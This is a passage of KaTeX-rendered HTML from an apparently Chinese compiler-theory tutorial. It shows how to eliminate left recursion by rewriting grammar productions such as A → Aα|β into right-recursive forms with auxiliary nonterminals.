mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>不以<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>开头，则可以写成等价右递归：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>A</mi><mo>→</mo><mi>β</mi><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mo>→</mo><mi>α</mi><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><mi>ϵ</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;A \\rightarrow \\beta A^{&#x27;}\\\\\n&amp;A^{&#x27;} \\rightarrow \\alpha A^{&#x27;}|\\epsilon\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.3049600000000003em;vertical-align:-1.4024800000000002em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9024800000000002em;\"><span style=\"top:-3.90248em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.25em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4024800000000002em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9024800000000002em;\"><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-2.25752em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">ϵ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4024800000000002em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>对于一般情况：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><mi>A</mi><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><mi>A</mi><msub><mi>α</mi><mi>m</mi></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mn>2</mn></msub><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow A \\alpha_{1}|A \\alpha_{2}|\\dots|A \\alpha_{m}|\\beta_{1}|\\beta_{2}|\\dots|\\beta_{n}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">A</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">A</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<p>可以写成：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>A</mi><mo>→</mo><msub><mi>β</mi><mn>1</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mn>2</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mi>n</mi></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><msub><mi>α</mi><mn>2</mn></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><msub><mi>α</mi><mi>m</mi></msub><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><mi>ϵ</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;A \\rightarrow \\beta_{1}A^{&#x27;}|\\beta_{2}A^{&#x27;}|\\dots|\\beta_{n}A^{&#x27;}\\\\\n&amp;A^{&#x27;} \\rightarrow \\alpha_{1}A^{&#x27;}|\\alpha_{2}A^{&#x27;}|\\dots|\\alpha_{m}A^{&#x27;}|\\epsilon\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.3049600000000003em;vertical-align:-1.4024800000000002em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9024800000000002em;\"><span style=\"top:-3.90248em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.25em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4024800000000002em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.9024800000000002em;\"><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-2.25752em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">ϵ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4024800000000002em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>可以进一步写成：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>A</mi><mo>→</mo><msup><mi>A</mi><msup><mrow></mrow><mrow><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo></mrow></msup></msup><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>A</mi><msup><mrow></mrow><mrow><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo></mrow></msup></msup><mo>→</mo><msub><mi>β</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mn>2</mn></msub><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><msub><mi>β</mi><mi>n</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mo>→</mo><msup><mi>A</mi><msup><mrow></mrow><mrow><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo></mrow></msup></msup><msup><mi>A</mi><msup><mrow></mrow><mo mathvariant=\"normal\">′</mo></msup></msup><mi mathvariant=\"normal\">∣</mi><mi>ϵ</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>A</mi><msup><mrow></mrow><mrow><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo><mo mathvariant=\"normal\">′</mo></mrow></msup></msup><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant=\"normal\">∣</mi><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant=\"normal\">∣</mi><mo>…</mo><mi mathvariant=\"normal\">∣</mi><msub><mi>α</mi><mi>m</mi></msub></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;A \\rightarrow A^{&#x27;&#x27;}A^{&#x27;}\\\\\n&amp;A^{&#x27;&#x27;}\\rightarrow \\beta_{1}|\\beta_{2}|\\dots|\\beta_{n} \\\\\n&amp;A^{&#x27;} \\rightarrow A^{&#x27;&#x27;&#x27;}A^{&#x27;}|\\epsilon \\\\\n&amp;A^{&#x27;&#x27;&#x27;} \\rightarrow \\alpha_{1}|\\alpha_{2}|\\dots|\\alpha_{m}\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:6.609920000000001em;vertical-align:-3.0549600000000003em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5549600000000003em;\"><span style=\"top:-5.55496em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span 